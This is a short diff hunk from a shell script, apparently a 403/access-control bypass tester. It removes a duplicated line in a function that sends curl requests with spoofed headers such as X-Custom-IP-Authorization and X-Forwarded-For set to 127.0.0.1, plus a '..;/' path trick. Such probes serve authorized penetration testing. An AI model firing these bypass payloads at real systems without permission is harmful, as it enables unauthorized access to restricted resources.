@@ -168,7 +168,6 @@ function payload_Header(){
 		output "X-Custom-IP-Authorization: 127.0.0.1 \t ${FULL_URL%/}..;/"  $(curl_wapper -H "X-Custom-IP-Authorization: 127.0.0.1" "${FULL_URL%/}..;/")
 	fi
 	output "X-Custom-IP-Authorization: 127.0.0.1 \t $FULL_URL"  $(curl_wapper -H "X-Custom-IP-Authorization: 127.0.0.1" $FULL_URL)
-	output "X-Custom-IP-Authorization: 127.0.0.1 \t $FULL_URL"  $(curl_wapper -H "X-Custom-IP-Authorization: 127.0.0.1" $FULL_URL)
 	output "X-Forwarded-For: http://127.0.0.1 \t $FULL_URL"  $(curl_wapper -H "X-Forwarded-For: http://127.0.0.1" $FULL_URL)
 	output "X-Forward-For: http://127.0.0.1 \t $FULL_URL"  $(curl_wapper -H "X-Forward-For: http://127.0.0.1" $FULL_URL)
 	output "X-Forwarded-For: 127.0.0.1:80 \t $FULL_URL"  $(curl_wapper -H "X-Forwarded-For: 127.0.0.1:80" $FULL_URL)
